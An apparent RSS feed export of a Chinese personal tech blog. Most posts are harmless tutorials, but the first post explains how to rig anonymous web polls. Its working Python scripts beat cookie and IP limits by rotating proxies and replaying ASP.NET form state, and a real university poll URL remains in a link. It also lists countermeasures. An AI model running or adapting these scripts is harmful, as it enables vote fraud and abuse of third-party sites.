<![CDATA[网上匿名投票<br><br>0.法律于道德<br>目前并没有找到相关的法律条文，因此些行为不算违法；从道德上讲，如果别人在刷，自己刷吗？如果一定要说什么众人皆醉我独醒，哪又何必去参选呢？<br><br>1.匿名投票的实现方式<br>无限制：虽然有一小部分投票完全没有限制，但目前的网投多数都有不同的限制方式：<br>Cookie限制：投完票后在客户机本地保存一份Cookie，然后投票按钮不再显示。<br>IP限制：每个IP只允许投一票，将投过票的IP保存到数据库中<br><br>2.矛：简单的刷票方法<br>无限制投票：最简单的方法就是不停的按F5刷新浏览器；或者用bash同时启动N多wget进程<br>Cookie限制：每次投完票后，IE-&gt;工具-&gt;Internet选项-&gt;清除Cookie，然后就可以再次投票了；或者写一个脚本，先建立连接，获得Cookie，再投票，同时启动N个该脚本。<br>IP限制：和突破Cookie的方法基本相同，只是建立连接的时候要使用代理，这样就等于伪装成代理的IP了。<br><br>3.盾：刷票的屏蔽方法<br>限制IP段：只允许指定IP段的用户投票，且每IP只能投一票。这个方法很厉害，可是有些麻烦，而且有时候不太适用。很多为了突破GFW而用代理的人怎么办？<br>限制代理：多数代理服务器，会在HTTP请求的头部加上原始请求的IP X-Forwarded-For，如果将这个和IP头部的IP一起检测，就可以防止Client-&gt;Proxy-&gt;Server的刷票方式。但是如果 Client-&gt;Proxy-&gt;Proxy-&gt;Server的刷票方式是可行的话，还是不能根除。<br>验证码技术：每次投票都要手工输入验证码，可以有效防止机器刷票<br>投票间隔检测：对同一被投者的短时间大量不明票源，可假设为刷票，进行进一步检测。<br>终极方案：不要匿名投票，注册投票，注册时用身份证进行区分。<br><br>几种刷票方式的python伪代码：<br><br>1)无限制投票<br><style>body { font-family:tahoma; font-size:10pt } p { font-family:tahoma; font-size:10pt } div { font-family:tahoma; font-size:10pt } td { font-family:tahoma; font-size:10pt } </style><font face="monospace"  >#!/usr/bin/python<br>imp<wbr>ort urllib,time<br>url="http://www.xxxx.com/post.asp?type=int&amp;name=click&amp;time="<br>while True:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;now=time.time()*1000<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;site=urllib.urlopen('%s%d' %(url,int(now)))<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print site.read()</font><br>2)Cookie和代理投票<br><style>body { font-family:tahoma; font-size:10pt } p { font-family:tahoma; font-size:10pt } div { font-family:tahoma; font-size:10pt } td { font-family:tahoma; font-size:10pt } </style>去掉proxy相关的内容就是Cookie投票，不去掉也可以<br><div>python xvote.py &lt; proxy.ok</div>  <div>&nbsp;</div>  <div>代理列表proxy.ok文件</div>  <div><font face="monospace"  >http://119.62.128.38:80</font></div>  <div><font face="monospace"  >http://148.233.239.24:3128</font></div>  <div><font face="monospace"  >http://148.233.239.23:80</font></div>  <div><font face="monospace"  >http://148.233.239.23:3128</font></div>  <div><br> xvote.py文件</div>  <div>#!/usr/bin/python</div>  <div>#xvote.py</div>  <div>#encoding: utf-8</div>  <div>imp<wbr>ort urllib2,urllib,cookielib,socket</div>  <div>imp<wbr>ort re</div>  <div>imp<wbr>ort thread,time,os,sys</div>  <div>def vote(index,proxy):</div>  <div>&nbsp;&nbsp;&nbsp;url='<a rel="nofollow" href="http://sunshine.hust.edu.cn/zt/footballbaby2009/Default.aspx%27"  >http://xxxx.edu.cn/xxxx/Default.aspx'</a></div>  <div>&nbsp;&nbsp;&nbsp;cj=cookielib.CookieJar()</div>  <div>&nbsp;&nbsp;&nbsp;opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cj),</div>  <div>&nbsp;&nbsp;&nbsp;urllib2.ProxyHandler(proxy))</div>  <div>&nbsp;&nbsp;&nbsp;urllib2.install_opener(opener)</div>  <div>&nbsp;</div>  <div>&nbsp;&nbsp;&nbsp;#get cookie</div>  <div>&nbsp;&nbsp;&nbsp;try:</div>  <div>raw=urllib2.urlopen(url).read()</div>  <div>&nbsp;&nbsp;&nbsp;except:</div>  <div>print 'proxy unavailable'</div>  <div>return</div>  <div>&nbsp;&nbsp;&nbsp;try:</div>  <div>viewState=re.findall('__VIEWSTATE" value="([^"]+)"',raw)[0]</div>  <div>eventValid=re.findall('__EVENTVALIDATION" value="([^"]+)"',raw)[0]</div>  <div>&nbsp;&nbsp;&nbsp;except:</div>  <div>open('raw.raw','w').write(raw)</div>  <div>return</div>  <div>&nbsp;&nbsp;&nbsp;da<wbr>ta={'__EVENTARGUMENT':'',</div>  <div>&nbsp;&nbsp;&nbsp;'__EVENTTARGET':'',</div>  <div>&nbsp;&nbsp;&nbsp;'__EVENTVALIDATION':eventValid,</div>  <div>&nbsp;&nbsp;&nbsp;'__LASTFOCUS':'',</div>  <div>&nbsp;&nbsp;&nbsp;'__VIEWSTATE':viewState,</div>  <div>&nbsp;&nbsp;&nbsp;'ctl00$masterPlace$playerList$ct001$playerVote':'on',</div>  <div>&nbsp;&nbsp;&nbsp;'ctl00$masterPlace$playerList$ct002$playerVote':'on',</div>  <div>&nbsp;&nbsp;&nbsp;'ctl00$masterPlace$voteSubmit':'投票'}</div>  <div>&nbsp;</div>  <div>&nbsp;&nbsp;&nbsp;#vote</div>  <div>&nbsp;&nbsp;&nbsp;try:</div>  <div>raw=urllib2.urlopen(url,urllib.urlencode(da<wbr>ta)).read()</div>  <div>&nbsp;&nbsp;&nbsp;except:</div>  <div>print 'proxy da<wbr>ta failed'</div>  <div>return</div>  <div>&nbsp;&nbsp;&nbsp;open('raw.%d' % index,'w').write(raw)</div>  <div>&nbsp;&nbsp;&nbsp;voteResult=re.findall('voteResult([^/]+)',raw)</div>  <div>&nbsp;&nbsp;&nbsp;if len(voteResult) &gt; 0:</div>  <div>print index,voteResult[0]</div>  <div>&nbsp;&nbsp;&nbsp;else:</div>  <div>print 'vote failed'</div>  <div>if __name__=='__main__':</div>  <div>&nbsp;&nbsp;&nbsp;socket.setdefaulttimeout(15)</div>  <div>&nbsp;&nbsp;&nbsp;raw=sys.stdin.readlines()#open('pedu.txt').readlines()</div>  <div>&nbsp;&nbsp;&nbsp;pids=[]</div>  <div>&nbsp;&nbsp;&nbsp;for i in range(len(raw)):</div>  <div>pid=os.fork()</div>  <div>proxy={'http':raw[i].strip('\n')}</div>  <div>print 'start ',i</div>  <div>if pid == 0:</div>  <div>&nbsp;&nbsp;&nbsp;vote(i,proxy)</div>  <div>&nbsp;&nbsp;&nbsp;sys.exit(0)</div>  <div>else:</div>  <div>&nbsp;&nbsp;&nbsp;pids.append(pid)</div>  <div>&nbsp;&nbsp;&nbsp;for x in pids:</div>  <div>os.waitpid(x,0)</div><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009103095317820/</guid>
    </item>
    <item>
      <title>
<![CDATA[百度地图在BSD下飞一样的速度]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720078774815668/</link>
      <description>
<![CDATA[今天用BSD试了一下百度的地图，不知道是早上网速好还是BSD的缘故，速度超好。就跟显示本机图片似的。<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720078774815668/</guid>
    </item>
    <item>
      <title>
<![CDATA[用Kindle3作raspberry pi的显示器]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201292805247715/</link>
      <description>
<![CDATA[把Kindle作为raspberry pi的屏幕，再加一个USB键盘，一个便携的小霸王编程机就诞生了，看hello worlp：<div><div><img title="用Kindle3作raspberry pi的显示器 - hankjin - 云水居"  alt="用Kindle3作raspberry pi的显示器 - hankjin - 云水居"  style="margin-top: 0px; margin-right: 10px; margin-bottom: 0px; margin-left: 0px; width: 300px; height: auto;"  src="http://img5.ph.126.net/zVXYPEt8PJec5kwfh6dzwg==/6597615124423755525.jpg"  ></div>&nbsp;<br><div><b>硬件：</b></div><div>1. Kindle3：淘宝</div><div>2. raspberry PI：易络盟</div><div><span style="line-height: 22px;"  >3. microUSB充电器一个：淘宝</span></div><div>4. USB转microUSB数据线一条：淘宝</div><div>5. USB键盘一个：淘宝</div><div>6. 视频线一条+电视一个 或 HDMI线一条+显示器一个：用于初始化设置raspberry PI, 以后就不用了。</div><div>7. SD卡一个：SanDisk闪迪 Ultra 高速 SD卡 SDHC 16G Class10 30M/s 200X 高清</div><div>8. SSD读卡器一个：淘宝</div><div>9. 网线：淘宝</div><div><b>软件：</b></div><div>1. Kindle3 越狱包：update_jailbreak_0.6.N_k3g_install.bin</div><div>2. Kindle3 usbnetwork：update_usbnetwork_0.33.N_k3g_install.bin</div><div>3. Kindle3 launchpad：update_launchpad_0.0.1c_k3g_install.bin</div><div>4. Kindle3 myts（Kindle3的虚拟终端）：myts-7.zip</div><div>5. Kindle3 usbnetwork的Windows驱动：XP-RNDIS-Ethernet-Gadget</div><div>6. win32DiskImage：Win32DiskImager.exe</div><div>7. raspberry pi镜像：2012-09-18-wheezy-raspbian.img</div><div>8. raspberry tmux：使用电视启动后，sudo apt-get install</div><div>9. raspberry dropbear：<span style="line-height: 22px;"  >使用电视启动后，sudo apt-get install</span></div><div><b>原理：</b></div><div>1. pi启动时自动登录，且自动使用tmux/screen共享session</div><div><span style="line-height: 22px;"  >2. kindle和pi使用usbnetwork创建连接</span> </div><div>3. kindle自动登录pi，且自动使用tmux/screen共享session</div><div>4. USB键盘和Kindle键盘分别操作两个pi和kindle，但是两者共享session，所以看起来是一样的。</div><div><div><b>参考：</b><wbr></div></div><div><a rel="nofollow" href="http://projectdp.wordpress.com/2012/09/24/pi-k3w-kindle-3-display-for-raspberry-pi/"  >http://projectdp.wordpress.com/2012/09/24/pi-k3w-kindle-3-display-for-raspberry-pi/</a> </div></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>OS</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201292805247715/</guid>
    </item>
    <item>
      <title>
<![CDATA[Windows和Ubuntu下的图片中的文字识别OCR]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200942382132968/</link>
      <description>
<![CDATA[在Windows上，最简单的办法就是使用Office的Document Image工具<br>点开始-程序-控制面板-添加/删除程序，找到Office-修改 找到Microsoft Office Document Imaging 这个组件，Microsoft Office Document Imaging Writer 点在本机上运行，安装就可以了。<br>首先把图片转换为，打开要识别的图片，点打印，打印机选择Microsoft Office Document Image Writer，打印到硬盘的某个文件夹下，记住位置，下一步要用<br>从开始菜单启动“Microsoft Office/ Microsoft Office 工具/Microsoft Office Document Imageing”。点击文件-》打开，然后选择刚才打印到的文件<br>点击工具栏中的“使用OCR识别文字”按键，就开始对刚才扫描的文件进行识别了。按下“将文本发送到Word”按键即可将识别出来的文字转换到 Word中去了。如果你要获取部分文字，只需要用鼠标框选所需文字，然后点击鼠标右键选择“将文本发送到Word”就将选中区域的文字发送到Word中了。<br><br>在Ubuntu下，就有很多可以用了，例如下面这三个<br>tesseract-ocr<br>ocrad<br>gocr <br>其中gocr是一个命令行的工具，不过很方便的<br>#安装<br>sudo apt-get install gocr<br>#Linux下的命令还是很好的，不会用就让他告诉你怎么用，直接输入gocr，它会提示你怎么用<br>gocr<br>#根据上一步命令的提示，查看使用说明<br>gocr -h<br>#gocr -h显示的帮助信息很全，只要看example就可以了，尤其是最后一行<br># examples:<br>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gocr -m 4 text1.pbm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # do layout analyzis<br>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gocr -m 130 -p ./database/ text1.pbm&nbsp; # extend database<br>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; djpeg -pnm -gray text.jpg | gocr -&nbsp;&nbsp;&nbsp; # use jpeg-file via pipe<br>#试一下，先找一个写满文字的jpg图片，如hank.jpg,<br>djpeg -pnm -gray hank.jpg | gocr -<br>#识别结果直接显示在终端上，虽然效果不太好<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200942382132968/</guid>
    </item>
    <item>
      <title>
<![CDATA[在Firefox中使用IRC]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720098242225902/</link>
      <description>
<![CDATA[首先安装Firefox的ChatZilla插件<br>然后从Firefox中打开ChatZilla， Tools-&gt;ChatZilla<br><br>进入freenode的irc网络<br>/attach freenode<br><br>注册账号<br>/nick hankjin<br>/msg nickserv register &lt;password&gt; &lt;email&gt;<br>#查收邮件，确认注册<br><span>/msg nickserv VERIFY REGISTER hankjin kyaguqqbfoaj</span><br><br>查看频道列表<br>/rlist ubuntu<br>进入频道<br>/join #ubuntu-cn<br>/join #python<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720098242225902/</guid>
    </item>
    <item>
      <title>
<![CDATA[Linux timer functions]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201421811512609/</link>
      <description>
<![CDATA[<div><br></div>&nbsp;<img title="Linux timer functions - hankjin - 云水居"   alt="Linux timer functions - hankjin - 云水居"   src="http://img1.ph.126.net/SCjjyD78-Hk7uT0e0T6QaQ==/6597941679379273519.png"   style="line-height: 28px; margin: 0px 10px 0px 0px;"   ><br><wbr>&nbsp;man for detail]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201421811512609/</guid>
    </item>
    <item>
      <title>
<![CDATA[2011购书]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720111272572780/</link>
      <description>
<![CDATA[列个书单<br>《美的历程》<br>《日知录》<br>《梦溪笔谈》<br>《颜氏家训》<br>《梦的解析》<br>《美学》<br>《人口原理》<br>《少年维特之烦恼》<br>《国富论》<br>选择一：书店<br>选择二：淘宝<br>选择三：卓越<br>价格上肯定淘宝最低，但淘宝要运费，而且一般每个书店都只有一两本合适的；<br>卓越免运费，但一者价格不满意，二者很多缺货；<br>宅得久了，逛逛书店倒也不错。<br>但基本每本都有好几个版本，又是一件头疼的事儿，书店一般只有一个版本，没有办法比较。<br><font id="word_name"  ><br>智慧的代价是矛盾，这是人生对人生观开的玩笑。</font>研究人员发现，选择太多令人迷惘，甚至可能导致抑郁。最简单的办法就是抛硬币，更有技术含量的是卜一卦，顺便买本《周易》]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720111272572780/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu下开始Haskell编程]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010111313923456/</link>
      <description>
<![CDATA[Haskell是一种纯函数编程语言，也是现在最广泛被应用研究的一门语言，它的很多思想对于现代编程思想和设计模式有重要的影响。所以学一下还是有一定的价值的。<br><wbr><br>首先安装Haskell环境<br>sudo apt-get install ghc6<br><b>交互式环境</b><br>使用ghci命令，可以进入交互式命令行，执行haskell操作并返回输出，例如：<br>$ghci<br>Prelude&gt; 3+4<br>7<br>Prelude&gt; putStrLn "Hello, Haskell"<br>Hello, Haskell<br>Prelude&gt; <br>按Ctrl+D退出<br><br><b>脚本编程</b><br>编写haskell脚本语言，然后保存成&lt;name&gt;.hs的文件，在haskell交互式环境下，可以使用:l &lt;name&gt;加载脚本，并使用。例如：<br>$cat &gt; test.hs &lt;&lt;EOF<br>add x y=x+y<br>EOF<br>$ghci<br>Prelude&gt; :l test<br>[1 of 1] Compiling Main&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ( test.hs, interpreted )<br>Ok, modules loaded: Main.<br>*Main&gt; add 3 4<br>7<br>也可以通过添加#!/usr/bin/runghc6，按脚本方式执行。<br>$cat &gt; hello.hs&lt;&lt;EOF<br>
#!/usr/bin/runghc6<br>
main=putStrLn "Hello, Haskell from elf"<br>
EOF<br>$ chmod +x hello.hs;./hello.hs<br>

Hello, Haskell from elf<br><br><b>编译执行<br></b>另外，Haskell脚本也可以编译成可执行文件。使用ghc命令，可以将Haskell脚本编译成可执行文件。例如：<br>$cat &gt; hello.hs&lt;&lt;EOF<br>#!/usr/bin/runghc6<br>main=putStrLn "Hello, Haskell from elf"<br>EOF<br>$ghc --make hello<br>[1 of 1] Compiling Main&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ( hello.hs, hello.o )<br>Linking hello ...<br>$ ./hello<br>Hello, Haskell from elf]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010111313923456/</guid>
    </item>
    <item>
      <title>
<![CDATA[JAVA字符编码的奥秘]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372006829055530/</link>
      <description>
<![CDATA[天气:<IMG src="http://img.blog.163.com/photo/bOzunJnM668KHCP8wFpfGQ==/4278982595955566812.gif">心情:<IMG src="http://img.blog.163.com/photo/qmcxKxMQX+esO4QSENBHeQ==/5131851775388843392.gif"><BR>
<P>一、概要<BR>在JAVA应用程序特别是基于WEB的程序中，经常遇到字符的编码问题。为了防止出现 </P>
<P>乱码，首先需要了解JAVA是如何处理字符的，这样就可以有目的地在输入/输出环节中</P>
<P>增加必要的转码。其次，由于各种服务器有不同的处理方式，还需要多做试验，确保使</P>
<P>用中不出现乱码。<BR>二、基本概念<BR>2．1 JAVA中字符的表达<BR>JAVA中有char、byte、String这几个概念。char 指的是一个UNICODE字符，为16位的</P>
<P>整数。byte 是字节，字符串在网络传输或存储前需要转换为byte数组。在从网络接收</P>
<P>或从存储设备读取后需要将byte数组转换成String。String是字符串，可以看成是由</P>
<P>char组成的数组。String 和 char 为内存形式，byte是网络传输或存储的序列化形式。<BR>&nbsp;举例：<BR>英<BR>String ying = “英”;<BR>char ying = ying.charAt(0);<BR>String yingHex = Integer.toHexString(ying);<BR>82 F1&nbsp;&nbsp; <BR>byte yingGBBytes = ying.getBytes(“GBK”);<BR>GB编码的字节数值<BR>D3 A2 <BR>2．2 编码方式的简介<BR>&nbsp;String序列化成byte数组或反序列化时需要选择正确的编码方式。如果编码方式不正确</P>
<P>，就会得到一些0x3F的值。常用的字符编码方式有ISO8859_1、GB2312、GBK、UTF</P>
<P>-8/UTF-16/UTF-32。<BR>ISO8859_1用来编码拉丁文，它由单字节（0－255）组成。<BR>&nbsp;GB2312、GBK用来编码简体中文，它有单字节和双字节混合组成。最高位为1的字节</P>
<P>和下一个字节构成一个汉字，最高位为0的字节是ASCII码。<BR>UTF-8/UTF-16/UTF-32是国际标准UNICODE的编码方式。 用得最多的是UTF-8，主要</P>
<P>是因为它在对拉丁文编码时节约空间。<BR>UNICODE值 UTF-8编码<BR>U-00000000 - U-0000007F: 0xxxxxxx<BR>U-00000080 - U-000007FF:&nbsp; 110xxxxx 10xxxxxx <BR>U-00000800 - U-0000FFFF:&nbsp; 1110xxxx 10xxxxxx 10xxxxxx <BR>U-00010000 - U-001FFFFF:&nbsp; 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx <BR>U-00200000 - U-03FFFFFF:&nbsp; 111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx <BR>U-04000000 - U-7FFFFFFF:&nbsp; 1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx </P>
<P>10xxxxxx <BR>三、J2SE中相关的函数<BR>String str =”英”;<BR>&nbsp;//取得GB2312编码的字节<BR>byte[] bytesGB2312 = str.getBytes(“GB2312”); <BR>//取得平台缺省编码的字节(solaris为ISO8859_1,windows为GB2312)<BR>byte[] bytesDefault = str.getBytes();<BR>//用指定的编码将字节转换成字符串<BR>&nbsp;String newStrGB = new String(bytesGB2312, “GB2312”);<BR>&nbsp;//用平台缺省的编码将字节转换成字符串(solaris为ISO8859_1,windows为GB2312)<BR>&nbsp;String newStrDefault = new String(bytesDefault);<BR>&nbsp;//用指定的编码从字节流里面读取字符<BR>InputStream in = xxx;<BR>InputStreamReader reader = InputStreamReader( in, “GB2312”);<BR>char aChar = reader.read();<BR>四、JSP、数据库的编码<BR>4．1 JSP中的编码<BR>(1) 静态声明:<BR>CHARSET有两个作用：<BR>JSP文件的编码方式：在读取JSP文件、生成JAVA类时，源JSP文件中汉字的编码<BR>JSP输出流的编码方式：在执行JSP时，往response流里面写入数据的编码方式<BR>(2) 动态改变:在往response流里面写数据前可以调用response.setContentType()，设</P>
<P>定正确的编码类型。<BR>(3) 在TOMCAT中，由Request.getParameter() 得到的参数，编码方式都是</P>
<P>ISO8859_1。所以如果在浏览器输入框内输入一个汉字“英”，在服务器端就得到一个</P>
<P>ISO8859_1编码的（0x00,0xD3,0x00,0xA2）。所以通常在接收参数时转码：<BR>String wrongStr = response.getParameter(“name”);<BR>String correctStr = new String(wrongStr.getBytes(“ISO8859_1”),”GB2312”);<BR>在最新的SERVLET规范里面，也可以在获取参数之前执行如下代码：<BR>request.setCharacterEncoding(“GB2312”);<BR>4．2 数据库的编码<BR>(1) 数据库使用UTF-16<BR>如果String中是UNICODE字符，写入读出时不需要转码<BR>(2) 数据库使用ISO8859_1<BR>如果String中是UNICODE字符，写入读出时需要转码<BR>写入：String newStr = new String(oldStr.getByte(“GB2312”), “ISO8859_1”);<BR>读出：String newStr = new String(oldStr.getByte(“ISO8859_1”),”GB2312”);</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372006829055530/</guid>
    </item>
    <item>
      <title>
<![CDATA[Spring get started]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372008324105848897/</link>
      <description>
<![CDATA[<P>1. Spring的IoC控件主要专注于如何利用classes、对象和服务去组成一个企业级应用，通过规范的方式，将各种不同的控件整合成一个完整的应用。Spring中使用了很多被实践证明的最佳实践和正规的设计模式，并且进行了编码实现。如果你是一个，构架师或者开发人员完全可以取出它们集成到你自己的应用之中。这对于那些使用了Spring Framework的组织和机构来说，在spring基础上实现应用不仅可以构建优秀的，可维护的应用并对Spring的设计进行验证，<EM >确实是一件好事情</EM>。</P>  <P>2. Example: Test.java+ShowMessage.java+test.xml</P>  <P>依赖类哭 spring.jar+common-logging.jar</P>  <P>javac *.java</P>  <P>java Test</P>  <P>2.1Test.java</P>  <P>import org.springframework.context.ApplicationContext;<BR>import org.springframework.context.support.FileSystemXmlApplicationContext;</P>  <P>public class Test {<BR>&nbsp;public static void main(String argv[]){<BR>&nbsp;&nbsp;//1. init context<BR>&nbsp;&nbsp;ApplicationContext ctx = new FileSystemXmlApplicationContext("myspring.xml");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;//2. get bean.<BR>&nbsp;&nbsp;SayHi sh = (SayHi)ctx.getBean("myBean");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;//3. invoke method<BR>&nbsp;&nbsp;sh.say();<BR>&nbsp;}<BR>}<BR></P>  <P>2.2 SayHi.java</P>  <P>public class SayHi {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private String name;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public void setName(String name){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.name = name;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public String getName(){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return this.name;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; /*methods*/<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public void say(){<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.print("Hi, " + getName());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>}<BR></P>  <P>2.3 test.xml</P>  <P>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<BR>&lt;!DOCTYPE beans PUBLIC "-//SPRING//DTD BEAN//EN" "<A rel="nofollow" href="http://www.springframework.org/dtd/spring-beans.dtd"  >http://www.springframework.org/dtd/spring-beans.dtd</A>"&gt;<BR>&lt;beans&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;bean id = "myBean" class="SayHi"&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;property name="name"&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;value&gt;hank&lt;/value&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/property&gt;<BR>&nbsp;&nbsp;&nbsp; &lt;/bean&gt;<BR>&lt;/beans&gt;<BR></P>  <P>&nbsp;</P>  <P>References:</P>  <P><A rel="nofollow" href="http://www.springframework.org/"  >http://www.springframework.org/</A></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372008324105848897/</guid>
    </item>
    <item>
      <title>
<![CDATA[计算字符串中最长不重复子串的长度]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010829111040124/</link>
      <description>
<![CDATA[求一个字符串中的无重复字符的子串的最大长度<br>如xabcdabxb<br>最长子串是：xabcd，长度是5，<br>而xabcda中有重复字符：两个a，所以不是最长子串。<br><br>#include &lt;algorithm&gt;<br>#include &lt;iostream&gt;<br>using namespace std;<br><br>int search(char *text){<br>&nbsp;&nbsp;&nbsp; int lastpos[256], lmax=0, curmax=0;<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;256;i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lastpos[i]=-1;<br>&nbsp;&nbsp;&nbsp; for(int i=0; text[i]; i++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(i-lastpos[ text[i] ] &gt; curmax){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; curmax++;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lmax = max(lmax, curmax);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; curmax = i-lastpos[ text[i] ];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lastpos[ text[i] ] = i;<br>&nbsp;&nbsp;&nbsp; }&nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp; return lmax;<br>}<br>int main(){<br>&nbsp;&nbsp;&nbsp; char raw[] = "xabcdabxb";<br>&nbsp;&nbsp;&nbsp; cout&lt;&lt;search(raw)&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp; return 0;<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010829111040124/</guid>
    </item>
    <item>
      <title>
<![CDATA[Fw网络基础入门]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372008414104653438/</link>
      <description>
